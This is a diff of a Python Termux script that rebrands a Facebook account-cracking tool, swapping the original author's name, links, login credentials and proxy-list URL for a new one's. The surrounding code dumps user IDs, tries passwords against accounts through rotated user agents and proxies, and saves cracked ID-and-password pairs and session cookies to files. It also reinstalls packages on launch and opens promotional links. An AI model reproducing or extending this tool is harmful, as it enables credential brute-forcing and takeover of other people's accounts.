@@ -1,11 +1,11 @@
-#Open Source By Md Sabbir Bhai
+#Open Source By TANJID VAI
 """
 
-REVERSE DONE BY Md Sabbir Bhai
+REVERSE DONE BY AHMED XD
 
 """
 
-#-----------------[ Md Sabbir Bhai ]-------------------#
+#-----------------[ ASHIK-King ]-------------------#
  
 import requests,bs4,json,os,sys,random,datetime,time,re
 import urllib3,rich,base64
@@ -22,7 +22,7 @@ from rich.text import Text as tekz
 from time import localtime as lt
 pretty.install()
 CON=sol()
- #------------------[ Md Sabbir Bhai ]-------------------#
+ #------------------[ ASHIK-King ]-------------------#
 import os, platform, time, sys
 os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests')
 os.system('pip install httpx pip install beautifulsoup4')
@@ -37,14 +37,16 @@ os.system("espeak -a 300 \"Checking,Update,\"")
 time.sleep(2)
 #os.system('clear')
 print('\033[97;1m[\x1b[38;5;50m+\033[97;1m] \x1b[38;5;50mUPDATE VERSHON 6.3V...! ')
-os.system("espeak -a 300 \"Welcome to Md Sabbir bhai UPDATE VERSION 8.3V,\"")
+os.system("espeak -a 300 \"UPDATE VERSION 6.3V,\"")
 time.sleep(2)
 #os.system('clear')
-print("\033[97;1m[\x1b[38;5;50m+\033[97;1m]\x1b[38;5;50m Joine  MY Facebook group.!")
-os.system("espeak -a 300 \"Sabbir ,Bhai, Dark, Group,\"")
+print("\033[97;1m[\x1b[38;5;50m+\033[97;1m]\x1b[38;5;50m SUBSCRIBE MY YOUTUBE CHANNEL..!")
+os.system("espeak -a 300 \"SUBSCRIBE,MY,YOUTUBE,CHANNEL,\"")
 time.sleep(2)
+os.system(f'xdg-open https://youtube.com/@bdtermux?si=wESEjGKD3-VZX-yf')
+os.system(f'xdg-open https://www.facebook.com/groups/266865079324430/?ref=share')
 ##os.system("espeak -a 300 \"Enter,Username,and,password, \"")##
-#------------------[ Sabbir-Bhai ]-------------------#
+#------------------[ ASHIK-King ]-------------------#
 #------------------[ USER-AGENT ]-------------------#
 ua = ["Mozilla/5.0 (Linux; Android 10; SM-A405FN Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/432.0.0.29.102",]
 ua = ["Mozilla/5.0 (Linux; Android 11; SM-A127F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/431.0.0.30.108",]
@@ -63,7 +65,7 @@ cokbrut=[]
 ses=requests.Session()
 prinCP=[]
 try:
-    prox= requests.get('https://github.com/Rdx337/Sabbiropi/blob/main/prox.txt').text
+    prox= requests.get('https://github.com/MAHADI-143/BDMC/blob/main/.prox.txt').text
     open('.prox.txt','w').write(prox)
 except Exception as e:
     pass
@@ -131,7 +133,7 @@ pwpluss,pwnya=[],[]
  
  
 
-#------------[ MD Sabbir- ]--------------#
+#------------[ ASHIK- ]--------------#
  
 P = '\x1b[1;97m'
 M = '\x1b[1;91m'
@@ -220,10 +222,10 @@ def linex():
     print('\033[1;37m')
 def animation(u):
     for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
-os.system('xdg-open https://www.facebook.com/profile.php?id=100089747571096&mibextid=ZbWKwL')
+os.system('xdg-open https://www.facebook.com/ashik.khan444?mibextid=b06tZ0')
 logo =(f"""
 \033[1;92m⊰᯽⊱┈──╌──────╌──╌╌──╌───╌❊╌──╌──╌────╌────╌─╌──┈⊰᯽⊱
-\033[1;91m[\033[1;92m√\033[1;91m]\033[1;92m \x1b[38;5;46m \033[1;91m|
+\033[1;91m[\033[1;92m√\033[1;91m]\033[1;92m \x1b[38;5;46m██████      █████  ███████ ██   ██ ██ ██   ██ \033[1;91m|
 \033[1;91m[\033[1;92m√\033[1;91m]\033[1;92m \x1b[38;5;47m██   ██    ██   ██ ██      ██   ██ ██ ██  ██  \033[1;91m|
 \033[1;91m[\033[1;92m√\033[1;91m]\033[1;92m \x1b[38;5;48m██████     ███████ ███████ ███████ ██ █████   \033[1;91m|
 \033[1;91m[\033[1;92m√\033[1;91m]\033[1;92m \x1b[38;5;49m██   ██    ██   ██      ██ ██   ██ ██ ██  ██  \033[1;91m|
@@ -238,7 +240,7 @@ logo =(f"""
 \033[1;92m⊰᯽⊱┈──╌──────╌──╌╌──╌───╌❊╌──╌──╌────╌────╌─╌──┈⊰᯽⊱
 \033[1;91m[\033[1;92m√\033[1;91m]\033[1;92m ASSALAMU ALAIKUM \033[1;95m● \033[1;95m● \033[1;91m● \033[1;92m● \033[1;93m●                 \033[1;91m[\033[1;92m√\033[1;91m]
 \033[1;92m⊰᯽⊱┈──╌──────╌──╌╌──╌───╌❊╌──╌──╌────╌────╌─╌──┈⊰᯽⊱
-\033[1;91m[\033[1;92m√\033[1;91m]\033[1;92m SABBIR-BHAI TERMUX COMMUNITY 💛\033[1;95m● \033[1;95m● \033[1;91m● \033[1;92m● \033[1;93m●    \033[1;91m[\033[1;92m√\033[1;91m]
+\033[1;91m[\033[1;92m√\033[1;91m]\033[1;92m RX-ASHIK TERMUX COMMUNITY 👨‍💻\033[1;95m● \033[1;95m● \033[1;91m● \033[1;92m● \033[1;93m●    \033[1;91m[\033[1;92m√\033[1;91m]
 \033[1;92m⊰᯽⊱┈──╌──────╌──╌╌──╌───╌❊╌──╌──╌────╌────╌─╌──┈⊰᯽⊱""")
 balpakna =("""\x1b[38;5;50m══════════════════════════════════════════════════""")    
 meyermarexudi =(""" \033[0;97m=============================================""")    
@@ -275,19 +277,19 @@ def meyexudi():
       print(' \x1b[38;5;50m║══[𝟸] 30 DAY 400 TAKA ')
       print(" \x1b[0m║══[𝟸] YOUR KEY : "+id)
       input(' \033[1;30m╚══[𝟹] IF U WANT TO BUY THEN PRESS ENTER ')
-      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://wa.me/+8801840762780?text='+tks),approval()      
+      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://wa.me/+8801935091078?text='+tks),approval()      
       time.sleep(1)
       meyexudi()
   except:
     sys.exit()
 meyexudi()
-#os.system("python Sabbirrdxi.py")
+#os.system("python ASHIK.py")
 def naima():
 	print('-------------------')
 print(logo)
 os.system('espeak -a 300 " Your,   Real,  Name,"')
 uname =input('\033[1;91m[\033[1;92m√\033[1;91m] \x1b[38;5;50mENTER YOUR NAME \033[1;91m: \33[1;32m')
-os.system('espeak -a 300 " Welcome,   to,  SABBIR BHAI,  V I P,  Tools"')
+os.system('espeak -a 300 " Welcome,   to,  ASHIK,  V I P,  Tools"')
 def back():
 	login()
 	
@@ -299,7 +301,7 @@ while attemps < 12345677901:
     username = input('\033[1;91m[\033[1;92m√\033[1;91m]\x1b[38;5;50m ENTER USERNAME: ')
     password = input('\033[1;91m[\033[1;92m√\033[1;91m]\x1b[38;5;50m ENTER PASSWORD: ')
 
-    if username == 'SABBIR' and password == '1122':
+    if username == 'ASHIK' and password == '63':
         print(' \033[0;92mYou Have Successfully Logged in.')
         break
     else:
@@ -375,8 +377,8 @@ def menu():
         dump_massal()
     elif ASHIK in ['1']:
         crack_file()
-    elif MDSABBIR BHAI in ['2','02']:
-        os.system('xdg-open https://github.com/Mdsabbirbhai')
+    elif ASHIK in ['2','02']:
+        os.system('xdg-open https://github.com/RX-ASHIK')
         os.system("python nono.py")
     elif ASHIK in ['3','03']:
         result()
@@ -614,7 +616,7 @@ def setting():
     print("\x1b[1;93m╚══\033[1;91m[\033[1;92m2\033[1;91m]\033[1;92m \x1b[38;5;50m CP ID [\x1b[38;5;50m2\x1b[1;95m]")
     print('\x1b[38;5;50m==================')
     hc = input('\033[1;91m[\033[1;92m√\033[1;91m] \033[1;96mCHOOSE: ')
-    #os.system("xdg-open https://t.me/mdsabbirbhai")
+    #os.system("xdg-open https://www.facebook.com/ASHIK.King.Ok.Bro")
     if hc in ['1','01']:
         method.append('mobile')
     elif hc in ['2','02']:
@@ -722,7 +724,7 @@ def passwrd():
 def crack(idf,pwv):
     global loop,ok,CP
     bo = random.choice([m,k,h,b,u,x])
-    sys.stdout.write(f"\r\033[100;92m{bo}[SABBIR-ON]-{P}[{H}{loop}{P}]-[{H}{len(id)}{P}]-[{H}OK{bo}-{H}{ok}{P}]-[{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
+    sys.stdout.write(f"\r\033[100;92m{bo}[ASHIK-ON]-{P}[{H}{loop}{P}]-[{H}{len(id)}{P}]-[{H}OK{bo}-{H}{ok}{P}]-[{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
     sys.stdout.flush()
     ua = random.choice(ugen)
     ua2 = random.choice(ugen2)
@@ -766,7 +768,7 @@ def crack(idf,pwv):
  
 def crackfree(idf,pwv):
     global loop,ok,CP
-    sys.stdout.write(f"\r{H}[SABBIR-ON]{P}-[{H}{loop}{P}]{P}-[{H}{len(id)}{P}]-[OK{P}-{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
+    sys.stdout.write(f"\r{H}[ASHIK-ON]{P}-[{H}{loop}{P}]{P}-[{H}{len(id)}{P}]-[OK{P}-{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
     sys.stdout.flush()
     ua = random.choice(ugen)
     ua2 = random.choice(ugen2)
@@ -796,7 +798,7 @@ def crackfree(idf,pwv):
                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                 print(f'\r\033[10;92m[{time.strftime("%H:%M")}•ASHIK-OK] \033[1;92m{idf} • \033[1;92m{pw} ')
                 print('\x1b[38;5;50m===============================================')
-                os.system('espeak -a 300 " MD SABBIR ,  Ok,  id"')
+                os.system('espeak -a 300 " ASHIK,  Ok,  id"')
                 open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                 break
                 
